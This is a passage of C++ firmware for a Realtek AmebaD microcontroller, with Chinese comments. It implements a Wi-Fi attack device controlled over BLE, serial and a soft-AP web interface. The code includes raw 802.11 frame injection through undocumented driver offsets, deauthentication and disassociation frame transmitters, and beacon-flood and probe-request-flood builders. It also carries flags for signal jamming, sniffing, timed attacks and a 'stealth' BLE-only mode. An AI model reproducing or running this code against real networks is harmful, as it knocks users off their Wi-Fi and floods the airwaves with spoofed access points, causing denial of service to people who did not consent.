    while (idx != cmdHead) {
      if (isStopCmdCstr(cmdRing[idx])) {
        found = true;
        break;
      }
      idx = (idx + 1) % CMD_RING_SIZE;
    }
  }
  rtw_exit_critical(NULL, NULL);
  return found;
}

bool consumePriorityStopIfPending() {
  bool pending = false;
  rtw_enter_critical(NULL, NULL);
  if (priorityStopPending) {
    priorityStopPending = false;
    pending = true;
  }
  rtw_exit_critical(NULL, NULL);
  if (pending) {
    handleCommand("stop");
  }
  return pending;
}

bool startsWithIgnoreCase(const String &s, const char *prefix) {
  if (!prefix) return false;
  size_t plen = strlen(prefix);
  if (s.length() < plen) return false;
  return strncasecmp(s.c_str(), prefix, plen) == 0;
}

void pollSerialInput() {
  while (Serial.available() > 0) {
    int raw = Serial.read();
    if (raw < 0) break;
    char c = (char)raw;
    if (c == '\r') continue;
    if (c == '\n') {
      if (serialRxOverflow) {
        serialRxOverflow = false;
        serialRxLen = 0;
        Serial.println("[ERROR] Serial line too long; discarded.");
        continue;
      }
      serialRxBuf[serialRxLen] = '\0';
      size_t start = 0;
      while (start < serialRxLen && (serialRxBuf[start] == ' ' || serialRxBuf[start] == '\t')) {
        start++;
      }
      size_t end = serialRxLen;
      while (end > start && (serialRxBuf[end - 1] == ' ' || serialRxBuf[end - 1] == '\t')) {
        end--;
      }
      serialRxBuf[end] = '\0';
      if (end > start) {
        const char *line = &serialRxBuf[start];
        if (isStopCmdCstr(line)) {
          rtw_enter_critical(NULL, NULL);
          emergencyStopRequested = true;
          priorityStopPending = true;
          rtw_exit_critical(NULL, NULL);
          // 急停直接走优先通道并清空待执行的旧串口指令，避免旧指令延后执行
          serialCmdHead = serialCmdTail;
        } else {
          uint8_t next = (serialCmdHead + 1) % SERIAL_CMD_QUEUE_SIZE;
          if (next != serialCmdTail) {
            strncpy(serialCmdQueue[serialCmdHead], line, sizeof(serialCmdQueue[0]) - 1);
            serialCmdQueue[serialCmdHead][sizeof(serialCmdQueue[0]) - 1] = '\0';
            serialCmdHead = next;
          } else {
            Serial.println("[WARN] Serial command queue full; dropped command.");
          }
        }
      }
      serialRxLen = 0;
    } else if (!serialRxOverflow) {
      if (serialRxLen + 1 < sizeof(serialRxBuf)) {
        serialRxBuf[serialRxLen++] = c;
      } else {
        serialRxOverflow = true;
      }
    }
  }
}

//==========================================================
// Flash Persistence (NVS Config Storage)
//==========================================================
#define CFG_MAGIC   0x57444B33UL  // "WDK3"
#define CFG_VERSION 3

#pragma pack(push, 1)
struct PersistConfig {
  uint32_t magic;
  uint16_t version;
  uint16_t size;
  char ap_ssid[33];
  char ap_pass[65];
  char ble_name[27];
  uint32_t cycle_delay;
  uint32_t scan_time;
  uint32_t num_send_frames;
  int32_t start_channel;
  uint8_t scan_between_cycles;
  uint8_t use_led;
  uint32_t crc32;
};
#pragma pack(pop)

uint32_t calcCrc32(const uint8_t *data, size_t len) {
  uint32_t crc = 0xFFFFFFFFUL;
  for (size_t i = 0; i < len; i++) {
    crc ^= data[i];
    for (int b = 0; b < 8; b++) {
      crc = (crc & 1) ? ((crc >> 1) ^ 0xEDB88320UL) : (crc >> 1);
    }
  }
  return crc ^ 0xFFFFFFFFUL;
}

void loadConfigFromFlash() {
  FlashMemory.read();
  PersistConfig cfg;
  memcpy(&cfg, FlashMemory.buf, sizeof(PersistConfig));
  if (cfg.magic != CFG_MAGIC || cfg.version != CFG_VERSION || cfg.size != sizeof(PersistConfig)) {
    Serial.println("[CFG] No valid flash config found, using defaults.");
    return;
  }
  uint32_t expectedCrc = calcCrc32((const uint8_t *)&cfg, offsetof(PersistConfig, crc32));
  if (cfg.crc32 != expectedCrc) {
    Serial.println("[CFG] Flash config CRC32 mismatch, using defaults.");
    return;
  }

  cfg.ap_ssid[32] = '\0';
  cfg.ap_pass[64] = '\0';
  cfg.ble_name[26] = '\0';

  if (strlen(cfg.ap_ssid) >= 1 && strlen(cfg.ap_ssid) <= 32) {
    strcpy(ap_ssid, cfg.ap_ssid);
  }
  if (strlen(cfg.ap_pass) >= 8 && strlen(cfg.ap_pass) <= 63) {
    strcpy(ap_pass, cfg.ap_pass);
  }
  if (strlen(cfg.ble_name) >= 1 && strlen(cfg.ble_name) <= 26) {
    strcpy(ble_name, cfg.ble_name);
  }
  if (cfg.cycle_delay >= 100 && cfg.cycle_delay <= 60000) {
    cycle_delay = cfg.cycle_delay;
  }
  if (cfg.scan_time >= 500 && cfg.scan_time <= 30000) {
    scan_time = cfg.scan_time;
  }
  if (cfg.num_send_frames >= 1 && cfg.num_send_frames <= 100) {
    num_send_frames = cfg.num_send_frames;
  }
  if (cfg.start_channel == 1 || (cfg.start_channel >= 36 && cfg.start_channel <= 165)) {
    start_channel = cfg.start_channel;
  }
  // 严格规范化布尔标志：避免空白 Flash 的 0xFF 字节被当作 true
  if (cfg.scan_between_cycles == 0 || cfg.scan_between_cycles == 1) {
    scan_between_cycles = (cfg.scan_between_cycles == 1);
  }
  if (cfg.use_led == 0 || cfg.use_led == 1) {
    USE_LED = (cfg.use_led == 1);
  }
  Serial.println("[CFG] Loaded config from Flash: SSID='" + String(ap_ssid) + "', BLE='" + String(ble_name) + "'");
}

void saveConfigToFlash() {
  PersistConfig cfg;
  memset(&cfg, 0, sizeof(PersistConfig));
  cfg.magic = CFG_MAGIC;
  cfg.version = CFG_VERSION;
  cfg.size = (uint16_t)sizeof(PersistConfig);
  strncpy(cfg.ap_ssid, ap_ssid, sizeof(cfg.ap_ssid) - 1);
  strncpy(cfg.ap_pass, ap_pass, sizeof(cfg.ap_pass) - 1);
  strncpy(cfg.ble_name, ble_name, sizeof(cfg.ble_name) - 1);
  cfg.cycle_delay = cycle_delay;
  cfg.scan_time = scan_time;
  cfg.num_send_frames = num_send_frames;
  cfg.start_channel = start_channel;
  cfg.scan_between_cycles = scan_between_cycles ? 1 : 0;
  cfg.use_led = USE_LED ? 1 : 0;
  cfg.crc32 = calcCrc32((const uint8_t *)&cfg, offsetof(PersistConfig, crc32));

  FlashMemory.read();
  if (memcmp(FlashMemory.buf, &cfg, sizeof(PersistConfig)) == 0) {
    Serial.println("[CFG] Flash config unchanged, skip erase/write.");
    return;
  }
  memcpy(FlashMemory.buf, &cfg, sizeof(PersistConfig));
  FlashMemory.update();
}

//==========================================================
// Web Server
//==========================================================
WiFiServer webServer(80);

// Wi-Fi 重启/切模后重新启用 Wi-Fi/BLE 共存仲裁，避免 BLE notify 吞吐或广播被抑制
void restoreBleCoex() {
  if (bleStarted) {
    wifi_btcoex_set_bt_on();
  }
}

void scheduleApRestart() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (apEnabled && !sniffingNow) {
    pendingApRestart = true;
    pendingApRestartAt = millis();
  }
}

void restoreDefaultChannelIfNeeded(bool force) {
  if (force || apEnabled || softApActive) {
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
    }
  }
}

void startSoftAP() {
  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
  webServer.end();
  softApActive = false;
  // Force-close WLAN first: after promisc mode WLAN0 is still "running", so a
  // bare wifi_on(RTW_MODE_AP) would be blocked by rltk_wlan_running() and the
  // radio would never switch back to AP.
  wifi_off();
  delay(20);
  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);
  // WiFi.apbegin() completes the full stack init that wifi_start_ap() skips:
  // wifi_on + LwIP_Init + netif_set_addr(192.168.1.1) + dhcps_init (DHCP server).
  WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
  webServer.begin();
  apEnabled = true;
  softApActive = true;
  setCurrentChannelSafe(WIFI_CHANNEL);
  restoreBleCoex();
}

// 切换至纯 STA 模式并恢复默认信道与 BLE 共存（供 ap off 与抓包退出/失败回滚复用）
bool enterStaMode(const char *context) {
  webServer.end();
  softApActive = false;
  wifi_off();
  delay(20);
  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
    if (context && context[0] != '\0') {
      Serial.print(" (");
      Serial.print(context);
      Serial.print(")");
    }
    Serial.println(".");
    restoreBleCoex();
    return false;
  }
  restoreBleCoex();
  if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
    setCurrentChannelSafe(WIFI_CHANNEL);
  } else {
    Serial.print("[WARN] wifi_set_channel(");
    Serial.print(WIFI_CHANNEL);
    Serial.println(") failed after STA switch.");
  }
  return true;
}

// 抓包退出或启用混杂回调失败后，按 apEnabled 恢复 SoftAP 或 BLE-only STA 模式
void restoreRadioAfterSniff() {
  if (apEnabled) {
    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
    // bring the AP and web server back up so the phone can reconnect.
    startSoftAP();
    Serial.println("[INFO] Soft AP restarted: " + String(ap_ssid));
  } else {
    // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
    if (enterStaMode("restoreRadioAfterSniff")) {
      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
    }
  }
}

void clearDeauthSniffState() {
  rtw_enter_critical(NULL, NULL);
  bool wasDeauthSniff = deauth_sniff_enabled;
  if (wasDeauthSniff) {
    isHopping = deauth_sniff_prev_hop;
    deauth_sniff_enabled = false;
    deauth_sniff_prev_hop = false;
  }
  has_sniffed_deauth = false;
  rtw_exit_critical(NULL, NULL);
}

void stopAllActiveAttacks() {
  attack_enabled = false;
  disassoc_enabled = false;
  timedAttackEnabled = false;
  scan_enabled = false;
  beacon_flood_enabled = false;
  probe_flood_enabled = false;
  signal_jam_enabled = false;
  if (USE_LED) digitalWrite(LED_B, LOW);
}

void stopConflictingModesBeforeAttack() {
  stopAllActiveAttacks();
  bool sniffActive = false;
  rtw_enter_critical(NULL, NULL);
  sniffActive = (isSniffing || deauth_sniff_enabled);
  rtw_exit_critical(NULL, NULL);
  if (sniffActive) {
    stopSniffing();
  }
}

void prepareRadioForSniff(bool turnOffAp) {
  webServer.end();
  softApActive = false;
  if (turnOffAp) {
    wifi_off();
    delay(20);
  }
}

void startMonitorSniff(SniffMode mode, bool timed, unsigned long dur) {
  if (mode == SNIFF_STOP) return;
  clearDeauthSniffState();
  resetHopState();
  timedSniffEnabled = timed;
  if (timed) {
    sniffStartTime = millis();
    sniffDuration = dur;
  }
  rtw_enter_critical(NULL, NULL);
  currentMode = mode;
  rtw_exit_critical(NULL, NULL);
  startSniffing();
}

//==========================================================
// BLE helpers (Nordic UART Service)
//==========================================================
// 零堆分配 UTF-8 安全截断拷贝，确保不把多字节 UTF-8 字符从中间腰斩（promisc 回调安全）
static void utf8SafeCopy(char *dst, size_t dstSize, const char *src) {
  if (!dst || dstSize == 0) return;
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t maxLen = dstSize - 1;
  size_t len = 0;
  while (len < maxLen && src[len] != '\0') {
    len++;
  }
  if (len > 0 && src[len] != '\0') {
    if (((uint8_t)src[len] & 0xC0) == 0x80) {
      size_t back = len;
      while (back > 0 && (((uint8_t)src[back - 1] & 0xC0) == 0x80)) {
        back--;
      }
      if (back > 0 && ((uint8_t)src[back - 1] & 0x80) != 0) {
        len = back - 1;
      } else {
        len = back;
      }
    }
  }
  if (len > 0) {
    memcpy(dst, src, len);
  }
  dst[len] = '\0';
}

void pushSniffLog(const char *msg) {
  char safeMsg[LOG_STR_LEN];
  utf8SafeCopy(safeMsg, sizeof(safeMsg), msg);

  rtw_enter_critical(NULL, NULL);
  uint8_t next = (logHead + 1) % LOG_RING_SIZE;
  if (next != logTail) {
    strncpy(sniffLogRing[logHead], safeMsg, LOG_STR_LEN - 1);
    sniffLogRing[logHead][LOG_STR_LEN - 1] = '\0';
    logHead = next;
  } else {
    droppedLogCount++;
  }
  // Also record into WebUI circular history so /api/logs can inspect captured frames
  strncpy(webLogHistory[webLogHead], safeMsg, LOG_STR_LEN - 1);
  webLogHistory[webLogHead][LOG_STR_LEN - 1] = '\0';
  webLogHead = (webLogHead + 1) % WEB_LOG_HISTORY_SIZE;
  if (webLogCount < WEB_LOG_HISTORY_SIZE) {
    webLogCount++;
  }
  rtw_exit_critical(NULL, NULL);
}

uint16_t getEffectiveBleAttMtu(uint8_t connId) {
  uint16_t mtuSize = 23;
  if (le_get_conn_param(GAP_PARAM_CONN_MTU_SIZE, &mtuSize, connId) != GAP_CAUSE_SUCCESS || mtuSize < 23) {
    return 23;
  }
  return mtuSize;
}

bool waitForBleTxCredit(uint8_t connId) {
  uint16_t remainCredits = 0;
  unsigned long waitStart = millis();
  while (BLE.connected(connId) && bleNotifyEnabled) {
    if (le_get_gap_param(GAP_PARAM_LE_REMAIN_CREDITS, &remainCredits) != GAP_CAUSE_SUCCESS) {
      return true;
    }
    if (remainCredits > 0) {
      return true;
    }
    if (millis() - waitStart >= 25) {
      return false;
    }
    delay(2);
  }
  return false;
}

void bleSendLine(const String &line) {
  uint8_t connId = activeConnId;
  if (!BLE.connected(connId) || !bleNotifyEnabled) return;

  uint16_t attMtu = getEffectiveBleAttMtu(connId);
  size_t mtuCap = (attMtu > 3) ? (size_t)(attMtu - 3) : 20;
  size_t bufCap = (size_t)BleTx.getBufferLen();
  if (bufCap == 0) bufCap = 20;
  size_t maxChunk = (mtuCap < bufCap) ? mtuCap : bufCap;
  if (maxChunk == 0) maxChunk = 20;

  String payload = line + "\n";
  const uint8_t *raw = (const uint8_t *)payload.c_str();
  size_t total = payload.length();
  size_t offset = 0;
  static uint8_t bleBurstCount = 0;

  while (offset < total) {
    if (!BLE.connected(connId) || !bleNotifyEnabled) return;
    size_t chunkLen = total - offset;
    if (chunkLen > maxChunk) chunkLen = maxChunk;

    waitForBleTxCredit(connId);
    if (!BLE.connected(connId) || !bleNotifyEnabled) return;
    if (!BleTx.setData((uint8_t *)(raw + offset), (uint16_t)chunkLen)) {
      Serial.println("[BLE] BleTx.setData failed");
      return;
    }
    BleTx.notify(connId);
    offset += chunkLen;
    bleBurstCount++;
    if (offset < total) {
      delay(2);
    } else if ((bleBurstCount & 0x03) == 0) {
      delay(1);
    }
  }
}

void bleSendLog(const String &msg) {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  String escaped = jsonEscapeTruncated(msg, 180, "...");
  bleSendLine(String("{\"t\":\"log\",\"m\":\"") + escaped + "\"}");
}

void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
  activeConnId = connID;
  if (chr->getDataLen() > 0) {
    String cmd = chr->readString();
    cmd.trim();
    if (cmd.length() > 0) {
      if (isStopCmdCstr(cmd.c_str())) {
        rtw_enter_critical(NULL, NULL);
        emergencyStopRequested = true;
        priorityStopPending = true;
        cmdHead = cmdTail;  // 急停清空此前排队的未消费 BLE 指令
        rtw_exit_critical(NULL, NULL);
        return;
      }
      if (cmd.length() >= BLE_BUF_SIZE) {
        rtw_enter_critical(NULL, NULL);
        bleCmdOversizeDrop = true;
        rtw_exit_critical(NULL, NULL);
        return;
      }
      rtw_enter_critical(NULL, NULL);
      uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
      if (next != cmdTail) {
        strncpy(cmdRing[cmdHead], cmd.c_str(), sizeof(cmdRing[0]) - 1);
        cmdRing[cmdHead][sizeof(cmdRing[0]) - 1] = '\0';
        cmdHead = next;  // only advance the ring, never block the BLE task
      } else {
        bleCmdQueueOverflow = true;
      }
      rtw_exit_critical(NULL, NULL);
    }
  }
}

void bleNotifCB(BLECharacteristic* /*chr*/, uint8_t connID, uint16_t cccd) {
  activeConnId = connID;
  bleNotifyEnabled = (cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY);
}

void updateBleName(const char *newName) {
  if (!newName || newName[0] == '\0') return;
  char nextName[sizeof(ble_name)];
  strncpy(nextName, newName, sizeof(nextName) - 1);
  nextName[sizeof(nextName) - 1] = '\0';
  if (strcmp(ble_name, nextName) == 0) {
    return;
  }
  strcpy(ble_name, nextName);
  if (!bleStarted) return;

  BLE.setDeviceName(String(ble_name));
  char gapName[GAP_DEVICE_NAME_LEN] = {0};
  strncpy(gapName, ble_name, GAP_DEVICE_NAME_LEN - 1);
  le_set_gap_param(GAP_PARAM_DEVICE_NAME, GAP_DEVICE_NAME_LEN, gapName);
  // 同步更新内置 GATT Device Name (0x2A00)，避免手机按 GATT 服务读取仍显示旧名
  gaps_set_parameter(GAPS_PARAM_DEVICE_NAME, (uint8_t)strlen(ble_name), (void *)ble_name);

  // AmebaD GAP: 仅在 GAP_ADV_STATE_IDLE 下允许完整刷新广播参数；未连接在播时先停后启
  T_GAP_DEV_STATE devState = {0, 0, 0, 0, 0};
  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
  bool wasAdvertising = (devState.gap_adv_state != GAP_ADV_STATE_IDLE);
  if (wasAdvertising) {
    le_adv_stop();
    unsigned long waitStart = millis();
    while (devState.gap_adv_state != GAP_ADV_STATE_IDLE && (millis() - waitStart < 250)) {
      delay(10);
      le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
    }
  }

  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->updateAdvertParams();
  uint8_t slave_init_mtu_req = 1;
  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
  le_adv_update_param();

  if (wasAdvertising && !BLE.connected(activeConnId)) {
    delay(20);
    le_adv_start();
  }
}

void setupBLE() {
  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  scndata.clear();
  scndata.addCompleteServices(BLEUUID(UART_SERVICE_UUID));

  BleRx.setWriteProperty(true);
  BleRx.setWriteNRProperty(true);
  BleRx.setWritePermissions(GATT_PERM_WRITE);
  BleRx.setWriteCallback(bleWriteCB);
  BleRx.setBufferLen(CHAR_VALUE_MAX_LEN);

  BleTx.setNotifyProperty(true);
  BleTx.setCCCDCallback(bleNotifCB);
  BleTx.setBufferLen(CHAR_VALUE_MAX_LEN);

  UartService.addCharacteristic(BleRx);
  UartService.addCharacteristic(BleTx);

  gap_config_max_mtu_size(247);
  BLE.init();
  BLE.setDeviceName(String(ble_name));
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->setScanRspData(scndata);
  BLE.configServer(1);
  BLE.addService(UartService);
  BLE.beginPeripheral();
  // BLEAdvert::updateAdvertParams() 会在 beginPeripheral() 内重置 GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ=false，
  // 必须在 beginPeripheral() 之后显式重新开启从机主动 MTU 协商请求（最大 247B）。
  uint8_t slave_init_mtu_req = 1;
  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
  bleStarted = true;
  Serial.println("[INFO] BLE UART service started (" + String(ble_name) + ")");
}

void blePushScanResults(bool emitBegin, bool isSync) {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  std::vector<WiFiScanResult> snap = snapshotScanResults();
  if (emitBegin) {
    bleSendLine(isSync ? "{\"t\":\"sync_begin\"}" : "{\"t\":\"scan_begin\"}");
  }
  for (size_t i = 0; i < snap.size(); i++) {
    String escapedSsid = jsonEscapeTruncated(snap[i].ssid, 96, "...");
    String line = "{\"t\":\"ap\",\"i\":" + String(i) +
                  ",\"s\":\"" + escapedSsid + "\"" +
                  ",\"b\":\"" + snap[i].bssid_str + "\"" +
                  ",\"c\":" + String(snap[i].channel) +
                  ",\"r\":" + String(snap[i].rssi);
    if (snap[i].selected) line += ",\"sel\":1";
    line += "}";
    bleSendLine(line);
  }
  bleSendLine(String(isSync ? "{\"t\":\"sync_end\",\"n\":" : "{\"t\":\"scan_end\",\"n\":") + String(snap.size()) + "}");
}

void blePushStatus() {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  unsigned long remSec = 0;
  unsigned long nowMs = millis();
  if (timedAttackEnabled && (nowMs - attackStartTime < attackDuration)) {
    remSec = (attackDuration - (nowMs - attackStartTime) + 999) / 1000;
  } else if (timedSniffEnabled && (nowMs - sniffStartTime < sniffDuration)) {
    remSec = (sniffDuration - (nowMs - sniffStartTime) + 999) / 1000;
  }
  bool deauthSniffSnap = false;
  bool sniffingSnap = false;
  SniffMode modeSnap = SNIFF_STOP;
  int chSnap = WIFI_CHANNEL;
  rtw_enter_critical(NULL, NULL);
  deauthSniffSnap = deauth_sniff_enabled;
  sniffingSnap = isSniffing;
  modeSnap = currentMode;
  chSnap = currentChannel;
  rtw_exit_critical(NULL, NULL);

  String line = "{\"t\":\"st\"";
  line += ",\"atk\":" + String(attack_enabled ? 1 : 0);
  line += ",\"dis\":" + String(disassoc_enabled ? 1 : 0);
  line += ",\"bcn\":" + String(beacon_flood_enabled ? 1 : 0);
  line += ",\"prb\":" + String(probe_flood_enabled ? 1 : 0);
  line += ",\"jam\":" + String(signal_jam_enabled ? 1 : 0);
  line += ",\"snf\":" + String(deauthSniffSnap ? 1 : 0);
  line += ",\"snfOn\":" + String(sniffingSnap ? 1 : 0);
  line += ",\"sMode\":" + String((int)modeSnap);
  line += ",\"hop\":" + String(isHopping ? 1 : 0);
  line += ",\"ch\":" + String(chSnap);
  line += ",\"ok\":" + String(tx_success_count);
  line += ",\"fail\":" + String(tx_fail_count);
  line += ",\"rem\":" + String(remSec);
  line += "}";
  bleSendLine(line);
}

void blePushInfo() {
  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
  String line = "{\"t\":\"cfg\"";
  line += ",\"delay\":" + String(cycle_delay);
  line += ",\"scan\":" + String(scan_time);
  line += ",\"frames\":" + String(num_send_frames);
  line += ",\"ch\":" + String(start_channel);
  line += ",\"sc\":" + String(scan_between_cycles ? 1 : 0);
  line += ",\"led\":" + String(USE_LED ? 1 : 0);
  line += ",\"ap\":" + String(apEnabled ? 1 : 0);
  line += "}";
  bleSendLine(line);

  // 动态 MTU 分片模式下固定发送单行完整 id（含 ssid/pass/ble），消除 Android 半同步写入旧值风险
  String idLine = "{\"t\":\"id\"";
  idLine += ",\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\"";
  idLine += ",\"pass\":\"" + jsonEscape(String(ap_pass)) + "\"";
  idLine += ",\"ble\":\"" + jsonEscape(String(ble_name)) + "\"";
  idLine += "}";
  bleSendLine(idLine);
}

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  if (frame == NULL || length == 0 || length > 1500) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Invalid raw frame or length!");
    return;
  }
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Wi-Fi interface is not up!");
    return;
  }
  uint8_t *wlan_dev = rltk_wlan_info;
  if (wlan_dev == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info dev is NULL!");
    return;
  }
  uint32_t **priv_slot = (uint32_t **)(wlan_dev + 0x10);
  uint32_t *priv_ptr = *priv_slot;
  if (priv_ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info priv_ptr is NULL!");
    return;
  }
  void *ptr = (void *)(*priv_ptr);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }

  uint8_t *pxmitpriv = (uint8_t *)ptr + 0xae0;
  void *frame_control = alloc_mgtxmitframe(pxmitpriv);
  if (frame_control == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
    return;
  }

  // 先对底层 xmitbuf 指针判空再 memset / +0x28 偏移，失败时释放已分配资源避免泄漏
  uint8_t *frame_buf = *(uint8_t **)((uint8_t *)frame_control + 0x80);
  if (frame_buf == NULL) {
    tx_fail_count++;
    void *pxmitbuf = *(void **)((uint8_t *)frame_control + 0x84);
    if (pxmitbuf != NULL) {
      rtw_free_xmitbuf(pxmitpriv, pxmitbuf);
    }
    rtw_free_xmitframe(pxmitpriv, frame_control);
    Serial.println("[TX ERROR] frame_buf is NULL!");
    return;
  }

  update_mgntframe_attrib(ptr, (uint8_t *)frame_control + 8);
  memset(frame_buf, 0, 0x68);
  uint8_t *frame_data = frame_buf + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)((uint8_t *)frame_control + 0x14) = (uint32_t)length;
  *(uint32_t *)((uint8_t *)frame_control + 0x18) = (uint32_t)length;
  int ret = dump_mgntframe(ptr, frame_control);
  if (ret == 0) {
    tx_success_count++;
  } else {
    tx_fail_count++;
    Serial.print("[TX ERROR] dump_mgntframe returned: ");
    Serial.println(ret);
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  const int tailLen = (channel >= 36) ? 10 : 9;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (channel >= 36) {
    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // 2.4GHz DS params
    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;
  int chSnap = getCurrentChannelSafe();

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  const int tailLen = (chSnap >= 36) ? 10 : 6;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (chSnap >= 36) {
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

